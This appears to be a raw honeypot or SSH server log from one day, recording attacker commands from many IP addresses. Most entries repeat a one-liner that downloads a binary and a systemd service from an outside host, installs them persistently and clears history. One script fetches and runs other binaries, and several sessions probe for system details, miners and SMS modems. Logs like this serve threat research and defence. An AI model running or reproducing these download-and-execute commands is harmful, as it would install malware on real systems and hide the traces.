start

2024-12-08 00:04:21.245557 - ('45.148.10.46', 42818) - apt
2024-12-08 00:04:22.156225 - ('45.148.10.46', 42818) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:04:33.059814 - ('45.148.10.46', 40120) - apt
2024-12-08 00:04:34.181833 - ('45.148.10.46', 40120) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:04:44.667862 - ('45.148.10.46', 46880) - apt
2024-12-08 00:04:46.365240 - ('45.148.10.46', 46880) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:04:57.559313 - ('45.148.10.46', 39454) - apt
2024-12-08 00:04:59.345113 - ('45.148.10.46', 39454) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:05:11.647785 - ('45.148.10.46', 46698) - apt
2024-12-08 00:05:13.152148 - ('45.148.10.46', 46698) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:05:24.584512 - ('45.148.10.46', 37956) - apt
2024-12-08 00:05:26.011426 - ('45.148.10.46', 37956) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:05:38.749688 - ('45.148.10.46', 41768) - apt
2024-12-08 00:05:39.857926 - ('45.148.10.46', 41768) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:05:50.267148 - ('45.148.10.46', 60222) - apt
2024-12-08 00:05:52.241657 - ('45.148.10.46', 60222) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:05:58.250957 - ('78.83.184.161', 58484) - scp -t /tmp/2dUmLxuO
2024-12-08 00:05:58.944277 - ('78.83.184.161', 58488) - scp -t /tmp/2dUmLxuO
2024-12-08 00:06:04.445909 - ('45.148.10.46', 42934) - apt
2024-12-08 00:06:05.880291 - ('45.148.10.46', 42934) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:06:16.150240 - ('45.148.10.46', 43282) - apt
2024-12-08 00:06:17.455281 - ('45.148.10.46', 43282) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:06:28.478696 - ('45.148.10.46', 45480) - apt
2024-12-08 00:06:29.963248 - ('45.148.10.46', 45480) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:06:42.551625 - ('45.148.10.46', 56060) - apt
2024-12-08 00:06:43.564394 - ('45.148.10.46', 56060) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:06:54.244241 - ('45.148.10.46', 50936) - apt
2024-12-08 00:06:55.442577 - ('45.148.10.46', 50936) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:07:07.343928 - ('45.148.10.46', 35030) - apt
2024-12-08 00:07:08.890869 - ('45.148.10.46', 35030) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:07:22.263492 - ('45.148.10.46', 47528) - apt
2024-12-08 00:07:23.171848 - ('45.148.10.46', 47528) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:07:33.770405 - ('45.148.10.46', 54838) - apt
2024-12-08 00:07:34.897432 - ('45.148.10.46', 54838) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:07:45.446243 - ('45.148.10.46', 32896) - apt
2024-12-08 00:07:47.147205 - ('45.148.10.46', 32896) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:08:01.660194 - ('45.148.10.46', 46838) - apt
2024-12-08 00:08:03.773062 - ('45.148.10.46', 46838) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:08:16.144059 - ('45.148.10.46', 50640) - apt
2024-12-08 00:08:17.462792 - ('45.148.10.46', 50640) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:08:27.775142 - ('45.148.10.46', 33940) - apt
2024-12-08 00:08:29.774629 - ('45.148.10.46', 33940) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 00:09:41.941375 - ('45.148.10.46', 59242) - apt
2024-12-08 00:10:06.056760 - ('45.148.10.46', 59242) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 03:11:08.507752 - ('122.41.245.117', 35624) - /ip cloud print
2024-12-08 03:11:09.735717 - ('122.41.245.117', 35624) - ifconfig
2024-12-08 03:11:10.739596 - ('122.41.245.117', 35624) - uname -a
2024-12-08 03:11:11.743602 - ('122.41.245.117', 35624) - cat /proc/cpuinfo
2024-12-08 03:11:12.747519 - ('122.41.245.117', 35624) - ps | grep '[Mm]iner'
2024-12-08 03:11:13.751511 - ('122.41.245.117', 35624) - ps -ef | grep '[Mm]iner'
2024-12-08 03:11:14.755443 - ('122.41.245.117', 35624) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 03:11:15.759270 - ('122.41.245.117', 35624) - echo Hi | cat -n
2024-12-08 03:42:49.381609 - ('20.21.136.216', 35088) - uname -a
2024-12-08 06:53:18.132242 - ('45.148.10.203', 52800) - apt
2024-12-08 06:53:19.313727 - ('45.148.10.203', 52800) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 06:53:27.239241 - ('45.148.10.203', 52816) - apt
2024-12-08 06:53:28.666998 - ('45.148.10.203', 52816) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 06:53:35.659590 - ('45.148.10.203', 48524) - apt
2024-12-08 06:53:36.772899 - ('45.148.10.203', 48524) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 06:53:44.438664 - ('45.148.10.203', 59314) - apt
2024-12-08 06:53:45.360928 - ('45.148.10.203', 59314) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 06:53:52.963441 - ('45.148.10.203', 34582) - apt
2024-12-08 06:53:54.263135 - ('45.148.10.203', 34582) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 07:09:39.073585 - ('49.175.248.68', 39190) - /ip cloud print
2024-12-08 07:09:40.182588 - ('49.175.248.68', 39190) - ifconfig
2024-12-08 07:09:41.081583 - ('49.175.248.68', 39190) - uname -a
2024-12-08 07:09:41.981579 - ('49.175.248.68', 39190) - cat /proc/cpuinfo
2024-12-08 07:09:42.881697 - ('49.175.248.68', 39190) - ps | grep '[Mm]iner'
2024-12-08 07:09:43.781227 - ('49.175.248.68', 39190) - ps -ef | grep '[Mm]iner'
2024-12-08 07:09:44.682781 - ('49.175.248.68', 39190) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 07:09:45.585275 - ('49.175.248.68', 39190) - echo Hi | cat -n
2024-12-08 07:36:46.379663 - ('124.48.34.3', 59270) - /ip cloud print
2024-12-08 07:36:47.476822 - ('124.48.34.3', 59270) - ifconfig
2024-12-08 07:36:48.368128 - ('124.48.34.3', 59270) - uname -a
2024-12-08 07:36:49.260637 - ('124.48.34.3', 59270) - cat /proc/cpuinfo
2024-12-08 07:36:50.152360 - ('124.48.34.3', 59270) - ps | grep '[Mm]iner'
2024-12-08 07:36:51.044658 - ('124.48.34.3', 59270) - ps -ef | grep '[Mm]iner'
2024-12-08 07:36:51.939548 - ('124.48.34.3', 59270) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 07:36:52.831827 - ('124.48.34.3', 59270) - echo Hi | cat -n
2024-12-08 07:49:43.420694 - ('61.32.167.121', 48852) - /ip cloud print
2024-12-08 07:49:45.208720 - ('61.32.167.121', 48852) - ifconfig
2024-12-08 07:49:46.568573 - ('61.32.167.121', 48852) - uname -a
2024-12-08 07:49:47.952603 - ('61.32.167.121', 48852) - cat /proc/cpuinfo
2024-12-08 07:49:49.340504 - ('61.32.167.121', 48852) - ps | grep '[Mm]iner'
2024-12-08 07:49:50.716335 - ('61.32.167.121', 48852) - ps -ef | grep '[Mm]iner'
2024-12-08 07:49:52.096266 - ('61.32.167.121', 48852) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 07:49:53.496120 - ('61.32.167.121', 48852) - echo Hi | cat -n
2024-12-08 09:03:28.923760 - ('218.92.0.132', 59228) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-08 09:03:31.196552 - ('218.92.0.132', 59228) - ls -la /var/run/gcc.pid
2024-12-08 13:44:26.268931 - ('14.58.14.151', 58526) - /ip cloud print
2024-12-08 13:44:27.242569 - ('14.58.14.151', 58526) - ifconfig
2024-12-08 13:44:28.035235 - ('14.58.14.151', 58526) - uname -a
2024-12-08 13:44:28.834282 - ('14.58.14.151', 58526) - cat /proc/cpuinfo
2024-12-08 13:44:29.627243 - ('14.58.14.151', 58526) - ps | grep '[Mm]iner'
2024-12-08 13:44:30.422000 - ('14.58.14.151', 58526) - ps -ef | grep '[Mm]iner'
2024-12-08 13:44:31.219421 - ('14.58.14.151', 58526) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 13:44:32.012136 - ('14.58.14.151', 58526) - echo Hi | cat -n
2024-12-08 14:23:14.883866 - ('195.178.110.6', 37382) - apt
2024-12-08 14:23:16.139617 - ('195.178.110.6', 37382) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 14:23:24.375254 - ('195.178.110.6', 46692) - apt
2024-12-08 14:23:25.880298 - ('195.178.110.6', 46692) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 14:23:34.490232 - ('195.178.110.6', 53310) - apt
2024-12-08 14:23:36.260550 - ('195.178.110.6', 53310) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 14:23:44.504794 - ('195.178.110.6', 57708) - apt
2024-12-08 14:23:45.957269 - ('195.178.110.6', 57708) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 14:23:54.741740 - ('195.178.110.6', 43932) - apt
2024-12-08 14:23:56.624425 - ('195.178.110.6', 43932) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:08:58.364644 - ('180.225.60.45', 42889) - /ip cloud print
2024-12-08 17:08:59.492754 - ('180.225.60.45', 42889) - ifconfig
2024-12-08 17:09:00.416685 - ('180.225.60.45', 42889) - uname -a
2024-12-08 17:09:01.336638 - ('180.225.60.45', 42889) - cat /proc/cpuinfo
2024-12-08 17:09:02.256834 - ('180.225.60.45', 42889) - ps | grep '[Mm]iner'
2024-12-08 17:09:03.176424 - ('180.225.60.45', 42889) - ps -ef | grep '[Mm]iner'
2024-12-08 17:09:04.096408 - ('180.225.60.45', 42889) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 17:09:05.016523 - ('180.225.60.45', 42889) - echo Hi | cat -n
2024-12-08 17:21:26.517302 - ('49.160.246.10', 55181) - /ip cloud print
2024-12-08 17:21:27.645525 - ('49.160.246.10', 55181) - ifconfig
2024-12-08 17:21:28.565514 - ('49.160.246.10', 55181) - uname -a
2024-12-08 17:21:29.485720 - ('49.160.246.10', 55181) - cat /proc/cpuinfo
2024-12-08 17:21:30.405695 - ('49.160.246.10', 55181) - ps | grep '[Mm]iner'
2024-12-08 17:21:31.325931 - ('49.160.246.10', 55181) - ps -ef | grep '[Mm]iner'
2024-12-08 17:21:32.245875 - ('49.160.246.10', 55181) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-08 17:21:33.170166 - ('49.160.246.10', 55181) - echo Hi | cat -n
2024-12-08 17:39:46.348163 - ('195.178.110.6', 59784) - apt
2024-12-08 17:39:47.460126 - ('195.178.110.6', 59784) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:39:59.068744 - ('195.178.110.6', 54996) - apt
2024-12-08 17:40:00.199268 - ('195.178.110.6', 54996) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:40:10.755899 - ('195.178.110.6', 40608) - apt
2024-12-08 17:40:11.985106 - ('195.178.110.6', 40608) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:40:23.392533 - ('195.178.110.6', 44472) - apt
2024-12-08 17:40:24.385252 - ('195.178.110.6', 44472) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:40:34.663062 - ('195.178.110.6', 45126) - apt
2024-12-08 17:40:35.927750 - ('195.178.110.6', 45126) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:40:47.136404 - ('195.178.110.6', 54962) - apt
2024-12-08 17:40:49.122933 - ('195.178.110.6', 54962) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:40:59.208886 - ('195.178.110.6', 44822) - apt
2024-12-08 17:41:00.623218 - ('195.178.110.6', 44822) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:41:11.793431 - ('195.178.110.6', 58444) - apt
2024-12-08 17:41:13.158449 - ('195.178.110.6', 58444) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:41:22.330479 - ('195.178.110.6', 33386) - apt
2024-12-08 17:41:23.833623 - ('195.178.110.6', 33386) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:41:33.573138 - ('195.178.110.6', 48542) - apt
2024-12-08 17:41:34.873715 - ('195.178.110.6', 48542) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:41:51.455297 - ('195.178.110.6', 37892) - apt
2024-12-08 17:41:53.448409 - ('195.178.110.6', 37892) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:42:01.354007 - ('195.178.110.6', 40634) - apt
2024-12-08 17:42:02.954909 - ('195.178.110.6', 40634) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:42:11.789744 - ('195.178.110.6', 40646) - apt
2024-12-08 17:42:12.979319 - ('195.178.110.6', 40646) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:42:22.751846 - ('195.178.110.6', 43036) - apt
2024-12-08 17:42:24.252410 - ('195.178.110.6', 43036) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:42:35.123476 - ('195.178.110.6', 47236) - apt
2024-12-08 17:42:36.438516 - ('195.178.110.6', 47236) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-08 17:42:46.547608 - ('195.178.110.6', 36252) - apt
